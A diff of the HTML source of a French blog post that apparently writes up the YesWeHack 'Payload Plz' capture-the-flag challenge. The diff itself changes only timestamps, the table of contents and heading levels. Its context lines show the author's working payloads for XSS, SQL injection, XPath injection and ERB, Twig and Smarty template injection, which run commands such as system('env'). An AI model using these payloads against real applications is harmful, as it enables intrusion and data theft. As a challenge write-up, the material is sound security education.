@@ -16,7 +16,7 @@ One Payload to rule them all Le challenge, affectueusement nommé &ldquo;Payload
 Comme chaque année, de nombreuses entreprises, écoles, associations ou entités publiques étaient présentes. Notamment YesWeHack qui cette année a proposé un petit challenge pour le moins intéréssant et qui vaut la peine d’être décortiquer.
 One Payload to rule them all Le challenge, affectueusement nommé “Payload Plz” (Ou comme nos amis Québécois diraient “Charge utile Svp”), a un principe simple : Il y a 13 petits challenges en tout genre (SQLi, SSTI, XSS, …) et nous devons en résoudre le plus possible avec 1 seule et même payload, et la plus courte possible. Notre payload nous donnera un score calculé ainsi :">
   <meta itemprop="datePublished" content="2025-07-06T15:51:41+00:00">
-  <meta itemprop="dateModified" content="2025-07-11T11:49:04+02:00">
+  <meta itemprop="dateModified" content="2025-07-11T13:26:05+02:00">
   <meta itemprop="wordCount" content="5270"><meta property="og:url" content="https://driikolu.fr/posts/payload-plz/">
   <meta property="og:site_name" content="La sécurité à la française">
   <meta property="og:title" content="Payload Plz - Analyse du challenge Yes We Hack">
@@ -27,7 +27,7 @@ One Payload to rule them all Le challenge, affectueusement nommé “Payload Plz
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2025-07-06T15:51:41+00:00">
-    <meta property="article:modified_time" content="2025-07-11T11:49:04+02:00">
+    <meta property="article:modified_time" content="2025-07-11T13:26:05+02:00">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Payload Plz - Analyse du challenge Yes We Hack">
@@ -50,7 +50,7 @@ One Payload to rule them all Le challenge, affectueusement nommé “Payload Plz
       "@type": "WebPage",
       "@id": "https:\/\/driikolu.fr\/posts\/payload-plz\/"
     },"genre": "posts","wordcount":  5270 ,
-    "url": "https:\/\/driikolu.fr\/posts\/payload-plz\/","datePublished": "2025-07-06T15:51:41+00:00","dateModified": "2025-07-11T11:49:04+02:00","publisher": {
+    "url": "https:\/\/driikolu.fr\/posts\/payload-plz\/","datePublished": "2025-07-06T15:51:41+00:00","dateModified": "2025-07-11T13:26:05+02:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
@@ -123,7 +123,7 @@ One Payload to rule them all Le challenge, affectueusement nommé “Payload Plz
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Payload Plz - Analyse Du Challenge Yes We Hack</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><a href="https://x.com/driikolu" title="Auteur"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='https://driikolu.fr/img/sloth.jpg' alt="Driikolu" height="16" width="16">&nbsp;Driikolu</a></span></div><div class="post-meta-line"><span title="publié le 2025-07-06 15:51:41"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-07-06">2025-07-06</time></span>&nbsp;<span title="Mis à jour le 2025-07-11 11:49:04"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-07-11">2025-07-11</time></span>&nbsp;<span title="5270 mots"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>environ 5300 mots</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>25 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><a href="https://x.com/driikolu" title="Auteur"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='https://driikolu.fr/img/sloth.jpg' alt="Driikolu" height="16" width="16">&nbsp;Driikolu</a></span></div><div class="post-meta-line"><span title="publié le 2025-07-06 15:51:41"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-07-06">2025-07-06</time></span>&nbsp;<span title="Mis à jour le 2025-07-11 13:26:05"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-07-11">2025-07-11</time></span>&nbsp;<span title="5270 mots"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>environ 5300 mots</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>25 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contenus</span>
@@ -131,41 +131,52 @@ One Payload to rule them all Le challenge, affectueusement nommé “Payload Plz
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#xss-1">XSS 1</a></li>
-    <li><a href="#xss-2">XSS 2</a></li>
-    <li><a href="#sql-injection-1">SQL Injection 1</a></li>
-    <li><a href="#sql-injection-2">SQL Injection 2</a></li>
-    <li><a href="#xpath-injection">XPath Injection</a></li>
-    <li><a href="#jinja-ssti">Jinja SSTI</a></li>
-    <li><a href="#brainfuck">Brainfuck</a></li>
-    <li><a href="#erb-ssti">ERB SSTI</a></li>
-    <li><a href="#twig-ssti">Twig SSTI</a></li>
-    <li><a href="#smarty-ssti">Smarty SSTI</a></li>
-    <li><a href="#bash">Bash</a></li>
-    <li><a href="#xxe">XXE</a></li>
-    <li><a href="#path-traversal">Path Traversal</a></li>
+    <li><a href="#one-payload-to-rule-them-all">One Payload to rule them all</a></li>
+    <li><a href="#les-13-challenges-individuellement">Les 13 challenges individuellement</a>
+      <ul>
+        <li><a href="#xss-1">XSS 1</a></li>
+        <li><a href="#xss-2">XSS 2</a></li>
+        <li><a href="#sql-injection-1">SQL Injection 1</a></li>
+        <li><a href="#sql-injection-2">SQL Injection 2</a></li>
+        <li><a href="#xpath-injection">XPath Injection</a></li>
+        <li><a href="#jinja-ssti">Jinja SSTI</a></li>
+        <li><a href="#brainfuck">Brainfuck</a></li>
+        <li><a href="#erb-ssti">ERB SSTI</a></li>
+        <li><a href="#twig-ssti">Twig SSTI</a></li>
+        <li><a href="#smarty-ssti">Smarty SSTI</a></li>
+        <li><a href="#bash">Bash</a></li>
+        <li><a href="#xxe">XXE</a></li>
+        <li><a href="#path-traversal">Path Traversal</a></li>
+      </ul>
+    </li>
   </ul>
 
   <ul>
-    <li><a href="#le-début-du-commencement">Le début du commencement</a></li>
-    <li><a href="#la-ssti-jinja2">La SSTI Jinja2</a></li>
-    <li><a href="#la-1ère-injection-sql">La 1ère Injection SQL</a></li>
-    <li><a href="#et-la-2nde-injection-sql">Et la 2nde Injection SQL</a></li>
-    <li><a href="#la-path-traversal">La Path Traversal</a></li>
-    <li><a href="#erb">ERB</a></li>
-    <li><a href="#smarty">Smarty</a></li>
-    <li><a href="#twig">Twig</a></li>
-    <li><a href="#xpath">Xpath</a></li>
-    <li><a href="#ajouter-les-xss-">Ajouter les XSS ?</a>
+    <li>
       <ul>
-        <li><a href="#dune-payload-deux-xss">D&rsquo;une payload, deux XSS</a></li>
-        <li><a href="#les-sqli">Les SQLi</a></li>
-        <li><a href="#le-nfkc">Le NFKC</a></li>
-        <li><a href="#xss--sqli">XSS + SQLi</a></li>
+        <li><a href="#le-début-du-commencement">Le début du commencement</a></li>
+        <li><a href="#la-ssti-jinja2">La SSTI Jinja2</a></li>
+        <li><a href="#la-1ère-injection-sql">La 1ère Injection SQL</a></li>
+        <li><a href="#et-la-2nde-injection-sql">Et la 2nde Injection SQL</a></li>
+        <li><a href="#la-path-traversal">La Path Traversal</a></li>
+        <li><a href="#erb">ERB</a></li>
+        <li><a href="#smarty">Smarty</a></li>
+        <li><a href="#twig">Twig</a></li>
+        <li><a href="#xpath">Xpath</a></li>
+        <li><a href="#ajouter-les-xss-">Ajouter les XSS ?</a>
+          <ul>
+            <li><a href="#dune-payload-deux-xss">D&rsquo;une payload, deux XSS</a></li>
+            <li><a href="#les-sqli">Les SQLi</a></li>
+            <li><a href="#le-nfkc">Le NFKC</a></li>
+            <li><a href="#xss--sqli">XSS + SQLi</a></li>
+          </ul>
+        </li>
+        <li><a href="#le-brainfuck">Le Brainfuck</a></li>
+        <li><a href="#la-xxe">La XXE</a></li>
       </ul>
     </li>
-    <li><a href="#le-brainfuck">Le Brainfuck</a></li>
-    <li><a href="#la-xxe">La XXE</a></li>
+    <li><a href="#la-payload-gagnante-">La payload gagnante !</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
   </ul>
 </nav></div>
       </div><div class="content" id="content"><p><img loading="lazy" src='/img/payloadplz.png' alt="Logo PayloadPlz"></p>
@@ -196,11 +207,11 @@ Notre payload nous donnera un score calculé ainsi :</p>
   </a>
 </h2><p>La première étape, pour bien commencer, est de résoudre tous les challenges individuellement. Cela nous permettra d&rsquo;avoir une base sur laquelle travailler notre payload.</p>
 <p>À savoir par avance que tous les challenges sont &ldquo;à l&rsquo;aveugle&rdquo;. Nous n&rsquo;aurons jamais la sortie, qu&rsquo;il y ai une erreur ou non. Notre seule information étant si la paylaod a résolu le challenge, c&rsquo;est à dire si le flag apparait dans la sortie.</p>
-<h2 class="heading-element" id="xss-1"><span>XSS 1</span>
+<h3 class="heading-element" id="xss-1"><span>XSS 1</span>
   <a href="#xss-1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Pour ce challenge, il fallait déclencher un appel à <code>alert(flag)</code> par un bot chromium à jour.
+</h3><p>Pour ce challenge, il fallait déclencher un appel à <code>alert(flag)</code> par un bot chromium à jour.
 Aucune protection n&rsquo;était appliquée et notre payload était injectée dans le code suivant (à la place de <code>$INPUT</code>):</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -218,11 +229,11 @@ Aucune protection n&rsquo;était appliquée et notre payload était injectée da
 <pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>On test. Le challenge est résolu. On passe au suivant.</p>
-<h2 class="heading-element" id="xss-2"><span>XSS 2</span>
+<h3 class="heading-element" id="xss-2"><span>XSS 2</span>
   <a href="#xss-2" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Seconde XSS où l&rsquo;objectif est le même : <code>alert(flag)</code>. Cependant le code est différent :</p>
+</h3><p>Seconde XSS où l&rsquo;objectif est le même : <code>alert(flag)</code>. Cependant le code est différent :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -240,11 +251,11 @@ Voici une solution :</p>
 <pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">&#39;</span><span class="p">;</span> <span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">/*</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Le commentaire à la fin de la payload permet d&rsquo;ignorer totalement la <em>quote</em> et donc de rendre le code valide.</p>
-<h2 class="heading-element" id="sql-injection-1"><span>SQL Injection 1</span>
+<h3 class="heading-element" id="sql-injection-1"><span>SQL Injection 1</span>
   <a href="#sql-injection-1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>On change de type de vulnérabilité avec les injections SQL.
+</h3><p>On change de type de vulnérabilité avec les injections SQL.
 On nous fourni cette fois le schéma de base de données avec l&rsquo;instruction de lire la colonne <code>flag</code> de la table <code>flag</code> :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -278,11 +289,11 @@ On nous fourni cette fois le schéma de base de données avec l&rsquo;instructio
 <pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT 1,2,flag FROM flag;</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Et on termine par un point virgule <code>;</code> afin de terminer la requête et d&rsquo;éviter les erreurs, la quote d&rsquo;après étant ignorée.</p>
-<h2 class="heading-element" id="sql-injection-2"><span>SQL Injection 2</span>
+<h3 class="heading-element" id="sql-injection-2"><span>SQL Injection 2</span>
   <a href="#sql-injection-2" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Globalement ce challenge est exactement le même que le précédent à une seule différence : notre input n&rsquo;est pas entrée en <em>string</em> (Elle n&rsquo;est pas entre <em>quotes</em>) :</p>
+</h3><p>Globalement ce challenge est exactement le même que le précédent à une seule différence : notre input n&rsquo;est pas entrée en <em>string</em> (Elle n&rsquo;est pas entre <em>quotes</em>) :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -299,11 +310,11 @@ On nous fourni cette fois le schéma de base de données avec l&rsquo;instructio
 <pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="mi">1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Et cette fois, pas besoin de commentaire ou de point virgule, la requête sera valide telle quelle.</p>
-<h2 class="heading-element" id="xpath-injection"><span>XPath Injection</span>
+<h3 class="heading-element" id="xpath-injection"><span>XPath Injection</span>
   <a href="#xpath-injection" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Pour ce challenge, un petit XML nous est présenté :</p>
+</h3><p>Pour ce challenge, un petit XML nous est présenté :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -353,11 +364,11 @@ Notre objectif est donc de sortir de la <em>string</em>, puis de la requête ini
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;] | //user[ 1=1 ]/password/text() | //user[ 1=&#34;</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On peut voir que l&rsquo;on sort de la requête initiale <code>&quot;]</code> que l&rsquo;on rajoute une requête qui récupère tous les <em>password</em> <code>| //user[ 1=1 ]/password/text()</code> puis que l&rsquo;on rend la requête valide <code>| //user[ 1=&quot;</code></p>
-<h2 class="heading-element" id="jinja-ssti"><span>Jinja SSTI</span>
+<h3 class="heading-element" id="jinja-ssti"><span>Jinja SSTI</span>
   <a href="#jinja-ssti" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Nous avons là un code python utilisa jinja2 sur notre payload :</p>
+</h3><p>Nous avons là un code python utilisa jinja2 sur notre payload :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -389,11 +400,11 @@ Le plus simple, à mon avis, étant d&rsquo;accéder au module <code>os</code> a
 </div>
 </div><p>Petite explication : <code>lipsum</code> est un builtins de jinja2. En tant que builtins il a accès directement à <code>__globals__</code> où tous les modules importés sont présent.
 Dans notre cas, <code>os</code> est importé dans le code fourni, mais il se trouve aussi dans le code importé de jinja2 <code>Environment</code>. Donc même sans cela nous pouvions y avoir accès.</p>
-<h2 class="heading-element" id="brainfuck"><span>Brainfuck</span>
+<h3 class="heading-element" id="brainfuck"><span>Brainfuck</span>
   <a href="#brainfuck" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Nous arrivons sur un challenge un peu moins &ldquo;banal&rdquo;, qui a peut-être fait peur à beaucoup au premier abord.
+</h3><p>Nous arrivons sur un challenge un peu moins &ldquo;banal&rdquo;, qui a peut-être fait peur à beaucoup au premier abord.
 L&rsquo;objectif est de lire, en brainfuck (un langage ésothérique), le flag séparé en 2 partie.</p>
 <p>La première partie est située à l&rsquo;adresse 0, la seconde partie se trouve sur le stdin.</p>
 <p>Si le brainfuck peut sembler peu simple d&rsquo;accès il l&rsquo;est moins pour nos amis les LLM comme Claude ou ChatGPT.
@@ -416,11 +427,11 @@ Et je ne dois pas me cacher, je leur ai demandé comment faire pour avoir à moi
 <p>On commence donc par une première boucle <code>[.&gt;]</code> qui va lire tous les caractères à partir de l&rsquo;adresse actuelle (l&rsquo;adresse 0), jusqu&rsquo;à ce qu&rsquo;une valeure nulle soit présente. Avec ça nous avons la première partie du flag.
 Ensuite nous avons une première virgule <code>,</code> pour mettre le 1ère octet de stdin à notre adresse actuelle. Puis il faut l&rsquo;afficher et récupérer la valeur suivante jusqu&rsquo;à ce qu&rsquo;on ai tout lu (donc jusqu&rsquo;à une valeur nulle) : <code>[.&gt;]</code></p>
 <p>Tout ça pour dire que le langage peut faire peur mais que l&rsquo;exercice en lui même était plutôt simple.</p>
-<h2 class="heading-element" id="erb-ssti"><span>ERB SSTI</span>
+<h3 class="heading-element" id="erb-ssti"><span>ERB SSTI</span>
   <a href="#erb-ssti" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>On a une seconde SSTI, ici en Ruby avec ERB.
+</h3><p>On a une seconde SSTI, ici en Ruby avec ERB.
 Comme la précédente, il nous faut lire la variable d&rsquo;environnement <code>FLAG</code> et on nous donne le code</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -449,11 +460,11 @@ Comme la précédente, il nous faut lire la variable d&rsquo;environnement <code
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%= ENV[&#39;FLAG&#39;] %&gt;</span></span></code></pre></td></tr></table>
 </div>
-</div><h2 class="heading-element" id="twig-ssti"><span>Twig SSTI</span>
+</div><h3 class="heading-element" id="twig-ssti"><span>Twig SSTI</span>
   <a href="#twig-ssti" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Encore une SSTI (et c&rsquo;est pas fini !), cette fois basée en PHP avec Twig, et encore une fois il faut lire la variable d&rsquo;environnement.</p>
+</h3><p>Encore une SSTI (et c&rsquo;est pas fini !), cette fois basée en PHP avec Twig, et encore une fois il faut lire la variable d&rsquo;environnement.</p>
 <p>Voici le code :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -501,11 +512,11 @@ Celle-ci nous permettra d&rsquo;exécuter la commande <code>env</code> qui va af
 <pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s1">&#39;env&#39;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)}}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Super, ça fonctionne tout seul.</p>
-<h2 class="heading-element" id="smarty-ssti"><span>Smarty SSTI</span>
+<h3 class="heading-element" id="smarty-ssti"><span>Smarty SSTI</span>
   <a href="#smarty-ssti" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>Et la dernière SSTI !
+</h3><p>Et la dernière SSTI !
 Elle est en Smarty, donc aussi PHP.</p>
 <p>On ne va pas tergiverser, voici le code :</p>
 <div class="highlight"><div class="chroma">
@@ -537,11 +548,11 @@ Twig intègre les fonctions PHP de bases, donc <code>system</code>, on va encore
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="nx">system</span><span class="p">(</span><span class="s1">&#39;env&#39;</span><span class="p">)}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Le challenge est passé !</p>
-<h2 class="heading-element" id="bash"><span>Bash</span>
+<h3 class="heading-element" id="bash"><span>Bash</span>
   <a href="#bash" class="heading-mark">
